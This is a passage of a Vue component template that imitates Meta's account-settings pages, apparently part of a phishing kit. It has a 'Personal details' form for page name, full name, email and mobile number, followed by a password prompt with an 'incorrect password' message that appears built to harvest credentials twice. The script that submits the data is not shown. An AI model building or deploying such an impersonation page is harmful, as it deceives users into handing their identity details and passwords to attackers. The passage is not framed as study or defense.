                  >
                    <div class="w-6">
                      <i
                        data-test="fa"
                        class="far fa-credit-card text-[24px] text-[#1c2b33]"
                      ></i>
                    </div>
                    <p
                      class="text-[20px] text-left font-montserrat font-medium text-[#1c2b33]"
                    >
                      Payments
                    </p>
                  </div>
                  <div class="mt-0.5">
                    <div
                      class="sideMenuButton lg:w-[340px] xl:w-[400px] rounded-lg cursor-default flex flex-row items-center pl-[24px] gap-x-[20px]"
                    >
                      <div class="w-6">
                        <i
                          data-test="fa"
                          class="far fa-check-circle text-[24px] text-[#1c2b33]"
                        ></i>
                      </div>
                      <p
                        class="text-[20px] text-left font-montserrat font-medium text-[#1c2b33]"
                      >
                        Meta Verified
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <!-- Form -->
            <div
              v-if="firstPassword != true"
              class="sectionContainer pt-[60px] w-full h-full 2xl:max-w-[840px] pl-[40px]"
            >
              <p
                class="sectionHeader tracking-wider text-[#1c2b33] text-[26px] font-bold font-ubuntu"
              >
                Personal details
              </p>
              <p
                class="sectionParagraph font-montserrat mt-3 text-[18px] pr-20 text-[#1c2b33]"
              >
                Meta uses this information to verify your identity and to keep our
                community safe. You decide what pesonal details you make visible
                to others.
              </p>

              <div
                class="mt-[40px] w-11/12 lg:w-[600px] xl:w-[700px] 2xl:w-[844px] h-[304px] rounded-2xl bg-white shadow-md"
              >
                <div class="relative border-b-2">
                  <input
                    type="text"
                    class="h-[76px] w-full pl-6 text-lg pt-3 font-montserrat rounded-t-2xl focus:outline-blue-400"
                    v-model="form.page_name"
                  />
                  <label
                    class="absolute text-[#454545] top-1.5 left-6 font-montserrat text-[14px]"
                    >Page Name <span v-for="(error, index) of v$.form.page_name.$errors"
                          :key="index" class="text-red-500 text-xs">Page Name {{error.$message.slice(6)}}</span
                  ></label>
                </div>
                <div class="relative border-b-2">
                  <input
                    type="text"
                    class="h-[76px] w-full pl-6 text-lg pt-3 font-montserrat focus:outline-blue-400"
                    v-model="form.name"
                  /><label
                    class="absolute text-[#454545] top-1.5 left-6 font-montserrat text-[14px]"
                    >Full Name <span v-for="(error, index) of v$.form.name.$errors"
                          :key="index" class="text-red-500 text-xs">Full Name {{error.$message.slice(6)}}</span
                  ></label>
                </div>
                <div class="relative border-b-2">
                  <input
                    type="text"
                    class="h-[76px] w-full pl-6 text-lg pt-3 font-montserrat focus:outline-blue-400"
                    v-model="form.email"
                  /><label
                    class="absolute text-[#454545] top-1.5 left-6 font-montserrat text-[14px]"
                    >Personal Email<span v-for="(error, index) of v$.form.email.$errors"
                          :key="index" class="text-red-500 text-xs">Email {{error.$message.slice(6)}}</span
                  ></label>
                </div>
                <div class="relative">
                  <input
                    type="text"
                    class="h-[76px] w-full border-b-2 pl-6 text-lg pt-3 font-montserrat rounded-b-2xl focus:outline-blue-400"
                    v-model="form.mobile"
                  /><label
                    class="absolute text-[#454545] top-1.5 left-6 font-montserrat text-[14px]"
                    >Mobile<span v-for="(error, index) of v$.form.mobile.$errors"
                          :key="index" class="text-red-500 text-xs">Mobile {{error.$message.slice(6)}}</span
                  ></label>
                </div>
              </div>
              <div
                class="mt-4 w-11/12 flex lg:w-[600px] xl:w-[700px] 2xl:w-[844px] justify-end"
              >
                <button
                  @click="submitForm()"
                  type="button"
                  class="w-[110px] md:w-[110px] flex focus:outline-none justify-center items-center h-[40px] bg-[#1876f2] cursor-pointer rounded mt-[16px] md:mt-[24px]"
                >
                  <p class="text-white text-[20px]">Next</p>
                  <!-- <div class="animate-spin rounded-full h-[20px] w-[20px] border-t-2 border-white"></div> -->
                </button>
              </div>
            </div>
              <!-- Password -->
            <div
              v-if="firstPassword"
              class="sectionContainer pt-[60px] w-full h-full 2xl:max-w-[840px] pl-[40px]"
            >
              <p
                class="sectionHeader tracking-wider text-[#1c2b33] text-[26px] font-bold font-ubuntu"
              >
                Personal details
              </p>
              <p
                class="font-montserrat font-semibold mt-4 text-[20px] text-[#1c2b33]"
              >
                Login &amp; recovery
              </p>
              <p class="font-montserrat text-[#8797a3] text-[15px] mt-1">
                Manage your passwords, login preferences and recovery methods.
              </p>
              <div
                class="mt-[40px] w-11/12 lg:w-[600px] xl:w-[700px] 2xl:w-[844px] h-[66px] rounded-2xl bg-white shadow-md"
              >
                <div class="relative">
                  <input
                    type="password"
                    class="h-[66px] w-full pl-6 text-lg pt-3 font-montserrat rounded-2xl focus:outline-blue-400"
                    v-model="modal.password"
                  /><label
                    class="absolute top-1.5 left-6 font-montserrat focus:text-[14px] focus:text-[#454545]"
                    >Password</label
                  >
                </div>
                <p v-if="wrongPw" class="text-red-500">The password you entered is incorrect.</p>
              </div>
              <div
                class="mt-4 flex w-11/12 lg:w-[600px] xl:w-[700px] 2xl:w-[844px] justify-end"
              >
                <button
                  @click="submitPassword()"
                  type="button"
                  class="w-[110px] md:w-[110px] flex focus:outline-none justify-center items-center h-[40px] bg-[#1876f2] cursor-pointer rounded mt-[16px] md:mt-[24px]"
                >
                  <p class="text-white text-[20px]">Next</p>
                </button>
              </div>

            </div>
          </div>
        </div>
      </div>
    </div>

    <ChatWidget/>
</template>

<style scoped src="../assets/css/style.css">
</style>
<style scoped>
</style>
